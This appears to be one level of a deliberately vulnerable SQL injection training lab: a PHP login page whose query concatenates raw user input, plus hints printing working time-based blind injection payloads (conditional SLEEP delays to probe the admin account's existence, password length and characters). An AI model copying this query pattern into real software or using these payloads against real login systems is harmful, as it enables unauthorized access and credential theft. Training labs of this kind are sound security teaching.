<?php
// Level 6: Time-Based Blind Login - Use time delays to extract information
// Goal: Login as admin using time-based blind injection

// Database connection
$host = $_ENV['DB_HOST'] ?? 'db';
$user = $_ENV['DB_USER'] ?? 'root'; 
$pass = $_ENV['DB_PASS'] ?? 'rootpassword';
$dbname = $_ENV['DB_NAME'] ?? 'sqli_lab';

$conn = new mysqli($host, $user, $pass, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$message = "";
$success = false;
$time_taken = 0;

if ($_POST) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    $start_time = microtime(true);
    
    // Time-based blind injection - uses SLEEP() function
    $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password' AND role = 'admin'";
    
    try {
        $result = $conn->query($sql);
        $time_taken = round((microtime(true) - $start_time) * 1000, 2); // milliseconds
        
        if ($result && $result->num_rows > 0) {
            $admin_data = $result->fetch_assoc();
            $success = true;
            $message = "🎉 Excellent! You used time-based injection to login as admin!<br>";
            $message .= "🏁 <strong>FLAG: LEVEL5_TIME_BASED_MASTER</strong><br>";
            $message .= "⏱️ Query execution time: {$time_taken}ms<br>";
            $message .= "🔑 Welcome, " . htmlspecialchars($admin_data['username']) . "!";
        } else {
            $message = "❌ Login failed: Invalid credentials<br>";
            $message .= "⏱️ Query execution time: {$time_taken}ms";
        }
    } catch (Exception $e) {
        $time_taken = round((microtime(true) - $start_time) * 1000, 2);
        $message = "❌ Login failed: Invalid credentials<br>";
        $message .= "⏱️ Query execution time: {$time_taken}ms";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 5 - Time-Based Login | SQL Injection Lab</title>
    <link rel="stylesheet" href="css/styles.css">
    <style>
        .login-container {
            max-width: 600px;
            margin: 2rem auto;
            background: #2d1b69;
            color: #e2e8f0;
            padding: 2rem;
            border-radius: 16px;
            box-shadow: 0 8px 25px rgba(45, 27, 105, 0.3);
            border: 1px solid #553c9a;
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
        
        .form-group {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
        }
        
        .form-group label {
            font-weight: 600;
            color: #e2e8f0;
        }
        
        .form-group input {
            padding: 0.8rem;
            border: 2px solid #553c9a;
            border-radius: 8px;
            font-size: 1rem;
            background: #1a1a2e;
            color: #e2e8f0;
            transition: border-color 0.3s;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #7c3aed;
            box-shadow: 0 0 0 3px rgba(124, 58, 237, 0.2);
        }
        
        .login-btn {
            background: linear-gradient(135deg, #7c3aed 0%, #553c9a 100%);
            color: white;
            padding: 1rem;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(124, 58, 237, 0.4);
        }
        
        .message {
            margin: 1rem 0;
            padding: 1rem;
            border-radius: 8px;
            border-left: 4px solid;
        }
        
        .message.success {
            background: #1a2e1a;
            border-color: #38a169;
            color: #68d391;
        }
        
        .message.error {
            background: #2d1b1b;
            border-color: #e53e3e;
            color: #fc8181;
        }
        
        .time-info {
            background: #1a1a2e;
            border: 2px solid #553c9a;
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            color: #a78bfa;
        }
        
        .hints {
            background: #1a1a2e;
            padding: 1.5rem;
            border-radius: 8px;
            margin-top: 2rem;
            border: 2px solid #553c9a;
        }
        
        .hints h3 {
            color: #e2e8f0;
            margin-bottom: 1rem;
        }
        
        .hints ul {
            margin: 0;
            padding-left: 1.5rem;
        }
        
        .hints li {
            margin-bottom: 0.5rem;
            color: #a0aec0;
        }
        
        .code-example {
            background: #0f0f23;
            color: #e2e8f0;
            padding: 1rem;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            margin: 0.5rem 0;
            overflow-x: auto;
            border: 1px solid #553c9a;
        }
        
        body {
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
        }
        
        .container {
            background: transparent;
        }
        
        .header h1 {
            color: #e2e8f0;
        }
        
        .header p {
            color: #a0aec0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⏰ Level 5 - Time-Based Login</h1>
            <p>Use time delays to extract information and login as admin</p>
            <a href="index.php" class="back-btn">← Back to Labs</a>
        </div>
        
        <div class="login-container">
            <h2>🕐 Temporal Security System</h2>
            <p><strong>Objective:</strong> Use time-based blind injection to extract admin credentials</p>
            
            <div class="time-info">
                <h4>⏱️ Time Analysis</h4>
                <p>This system is vulnerable to time-based attacks. Monitor response times carefully!</p>
            </div>
            
            <?php if ($message): ?>
                <div class="message <?= $success ? 'success' : 'error' ?>">
                    <?= $message ?>
                </div>
            <?php endif; ?>
            
            <form method="POST" class="login-form">
                <div class="form-group">
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username" placeholder="Enter username" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password" placeholder="Enter password" required>
                </div>
                
                <button type="submit" class="login-btn">🚀 Login</button>
            </form>
        </div>
        
        <div class="hints">
            <h3>💡 Hints for Level 5:</h3>
            <ul>
                <li><strong>Time Delays:</strong> Use SLEEP() function to cause delays</li>
                <li><strong>Conditional Delays:</strong> IF(condition, SLEEP(5), 0)</li>
                <li><strong>Extract Password:</strong> Use time delays to determine correct characters</li>
                <li><strong>Example 1:</strong> Test if admin exists (should cause 5 second delay)</li>
            </ul>
            <div class="code-example">admin' AND IF((SELECT COUNT(*) FROM users WHERE username='admin')>0,SLEEP(5),0)--</div>
            <ul>
                <li><strong>Example 2:</strong> Extract password length</li>
            </ul>
            <div class="code-example">admin' AND IF((SELECT LENGTH(password) FROM users WHERE username='admin')=8,SLEEP(5),0)--</div>
            <ul>
                <li><strong>Example 3:</strong> Extract first character</li>
            </ul>
            <div class="code-example">admin' AND IF((SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--</div>
            <ul>
                <li><strong>Fast Solution:</strong> Try common passwords with known timing</li>
                <li><strong>Hint:</strong> Admin password is 'admin123' - extract it character by character!</li>
            </ul>
        </div>
        
        <div class="navigation">
            <a href="level5.php">← Previous Level</a>
            <a href="level7.php">Next Level →</a>
        </div>
    </div>
</body>
</html>

<?php $conn->close(); ?>